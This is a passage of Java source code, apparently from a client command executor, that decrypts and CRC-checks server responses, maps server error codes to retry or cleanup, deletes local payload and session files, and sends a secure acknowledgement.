		 * The purpose of this method is for testing in cas that server return plaintext.
		 * This method acting like a man in the middle, decrypt data and then pass to 
		 * response processing state.
		 */
		private void _testParsingResponseAsPlainText(){
			FxLog.d(TAG, "> _testParsingResponseAsPlainText");
			byte[] response = mExecutorSession.httpResponseStream.toByteArray();
			byte[] plainText = new byte[response.length-1];
			System.arraycopy(response, 1, plainText, 0, plainText.length);
			try {
				plainText = com.vvt.crypto.AESCipher.decrypt(mExecutorSession.packetBuilderResponse.getAesKey(), plainText);
				ByteArrayOutputStream stream = new ByteArrayOutputStream();
				stream.write(0);
				stream.write(plainText, 0, plainText.length);
				mExecutorSession.httpResponseStream = stream;
				doProcessResponse();
			} catch (InvalidKeyException e) {
				FxLog.e(TAG, String.format("> _testParsingResponseAsPlainText # %s", e.getMessage()));
				if(mExecutorSession.commandListener != null){
					invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_TRANSPORT_ERROR, mExecutorSession.csid, e);
				}
				processingNextRequest();
			}
		}
		
		private void doProcessResponse(){
			mExecutorSession.currentState = PROCESS_RESPONSE;
			//TODO process GetAdreesbook on File
			
			byte[] response = mExecutorSession.httpResponseStream.toByteArray();
			IOStreamUtil.safelyCloseStream(mExecutorSession.httpResponseStream);
			//1 check encryption
			int encrypted = response[0];
			byte[] plainText = new byte[response.length-1];
			System.arraycopy(response, 1, plainText, 0, plainText.length);
			if(encrypted == 1){
				FxLog.v(TAG, "CommandExecutor > doProcessResponse # Decrypt response");
				try {
					//for test handle decrypt error
					/*if(true){
						plainText = com.vvt.crypto.AESCipher.decrypt(null, plainText);
					}*/
					plainText = com.vvt.crypto.AESCipher.decrypt(mExecutorSession.packetBuilderResponse.getAesKey(), plainText);
				} catch (InvalidKeyException e) {
					if(mExecutorSession.commandListener != null){
						invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_TRANSPORT_ERROR, mExecutorSession.csid, e);
					}
					processingNextRequest();
					return;
				} catch(IllegalArgumentException e){
					if(mExecutorSession.commandListener != null){
						invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_TRANSPORT_ERROR, mExecutorSession.csid, 
								new IllegalArgumentException("IllegalArgumentException while decrypt response data", e));
					}
					processingNextRequest();
					return;
				}
			}else{
				FxLog.v(TAG, "CommandExecutor > doProcessResponse # Response data is not encrypted");
			}
			
			//2 check CRC value
			ByteArrayInputStream streamIn = new ByteArrayInputStream(plainText);
			byte[] buffer = {0, 0, 0, 0, 0, 0, 0, 0};
			streamIn.read(buffer, 4, 4);
			long storedCrc = ByteUtil.toLong(buffer);
			buffer = new byte[plainText.length - 4];
			streamIn.read(buffer, 0, buffer.length);
			IOStreamUtil.safelyCloseStream(streamIn);
			long calculatedCrc = com.vvt.crc.CRC32Checksum.calculate(buffer);
			FxLog.v(TAG, String.format("CommandExecutor > doProcessResponse # Stored CRC: %d, Calculated CRC: %d", storedCrc, calculatedCrc));
			//for test invalid CRC value
			//calculatedCrc = -1;
			if(calculatedCrc != storedCrc){
				FxLog.w(TAG, "CommandExecutor > doProcessResponse # CRC Value is invalid");
				if(mExecutorSession.commandListener != null){
					invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_TRANSPORT_ERROR, mExecutorSession.csid, new Exception("CRC Value is invalid"));
				}
				processingNextRequest();
			}else{
				//3 parsing response
				try {
					ResponseData responseObj = ResponseParser.parseResponse(buffer, false);
					responseObj.setCsid(mExecutorSession.csid);
					doNotifySuccess(responseObj);
				} catch (IOException e) {
					FxLog.w(TAG, String.format("CommandExecutor > doProcessResponse # %s", e.getMessage()));
					if(mExecutorSession.commandListener != null){
						invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_TRANSPORT_ERROR, mExecutorSession.csid, e);
					}
				}
			}
			
		}
		
		// ************************************************* Ending Phase ************************************* //
		
		private void doNotifySuccess(ResponseData response){
			mExecutorSession.currentState = NOTIFY_SUCCESS;
			boolean clearResource;
			//for test invalid response code
			//if(false){
			if(response.getStatusCode() == PhoenixResponseCode.OK){	
				FxLog.v(TAG, "CommandExecutor > doNotifySuccess # Response OK");
				if(mExecutorSession.commandListener != null){
					invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_SUCCESS, response);
				}
				clearResource = true;
			}else{
				FxLog.w(TAG, "CommandExecutor > doNotifySuccess # Response Error");
				if(mExecutorSession.commandListener != null){
					invokeAsyncCallback(mExecutorSession.commandListener, CommandListener.ON_SERVER_ERROR, response);
				}
				clearResource = eligibleToClearResource(response.getStatusCode());
			}
			
			if(clearResource){
				doClearResource(true);
			}else{
				processingNextRequest();
			}
		}
		/**
		 * Use to make decision whether to clear resources or not when receive server error.
		 * @param errorCode
		 * @return TRUE if eligible to clear resources, FALSE otherwise.
		 */
		private boolean eligibleToClearResource(int errorCode){
			
			boolean result;
			switch(errorCode){
				case PhoenixResponseCode.SERVER_BUSY_PROCESSING_CSID :
					result = false;
					FxLog.w(TAG, String.format("CommandExecutor > eligibleToClearResource # Error code: %d", PhoenixResponseCode.SERVER_BUSY_PROCESSING_CSID));
					FxLog.w(TAG, "CommandExecutor > eligibleToClearResource # Keep payload and session data");
					break;
						
				case PhoenixResponseCode.INCOMPLETE_PAYLOAD :
					result = false;
					FxLog.w(TAG, String.format("CommandExecutor > eligibleToClearResource # Error code: %d", PhoenixResponseCode.INCOMPLETE_PAYLOAD));
					FxLog.w(TAG, "CommandExecutor > eligibleToClearResource # Keep payload and session data");
					break;
					
				case PhoenixResponseCode.SERVER_BUSY :
					result = false;
					FxLog.w(TAG, String.format("CommandExecutor > eligibleToClearResource # Error code: %d", PhoenixResponseCode.SERVER_BUSY));
					FxLog.w(TAG, "CommandExecutor > eligibleToClearResource # Keep payload and session data");
					break;
					
				case PhoenixResponseCode.LICENSE_CORRUPT :
					result = false;
					FxLog.w(TAG, String.format("CommandExecutor > eligibleToClearResource # Error code: %d", PhoenixResponseCode.LICENSE_CORRUPT));
					FxLog.w(TAG, "CommandExecutor > eligibleToClearResource # Keep payload and session data");
					break;
					
				default :
					result = true;
					FxLog.w(TAG, "CommandExecutor > eligibleToClearResource # Other kind of error, delete payload and session data");
			}
			return result;
		}
		
		private void doClearResource(boolean sendAcknowledge){
			FxLog.d(TAG, "CommandExecutor > doClearResource");
			mExecutorSession.currentState = CLEAR_RESOURCE;		
			
			//delete payload
			File f;
			if(mExecutorSession.isNewRequest){
				if(mExecutorSession.newRequest.getTransportDirective() == TransportDirectives.RESUMABLE){
					f = new File(mExecutorSession.newRequest.getPayloadPath());
				}else{
					f = null;
				}
			}else{
				f = new File(mExecutorSession.sessionInfo.getPayloadPath());
			}
			if(f != null){
				if(f.delete()){
					FxLog.v(TAG, "CommandExecutor > doClearResource # Payload is deleted");
				}else{
					FxLog.w(TAG, "CommandExecutor > doClearResource # Some error while deleting payload");
				}
			}
			
			//delete session
			if(mExecutorSession.sessionInfo != null){
				if(mSessionManager.deleteSession(mExecutorSession.sessionInfo.getCsid())){
					FxLog.v(TAG, "CommandExecutor > doClearResource # Session is deleted");
				}else{
					FxLog.w(TAG, String.format("> executeNewRequest # Cannot delete session of CSID %d", mExecutorSession.sessionInfo.getCsid()));
				}
			}else{
				FxLog.w(TAG, "CommandExecutor > doClearResource # Session is null");
			}
			
			//send acknowledge
			if(sendAcknowledge){
				FxLog.v(TAG, "CommandExecutor > doClearResource # Send secure acknowledge");
				UnstructuredManager unstructManager = new UnstructuredManager(mUnstructuredUrl);
				unstructManager.doAckSecure(1, mExecutorSession.ssid);
			}else{
				FxLog.v(TAG, "CommandExecutor > doClearResource # No need to secure acknowledge");
			}
			
			processingNextRequest();
		}

	}
	
}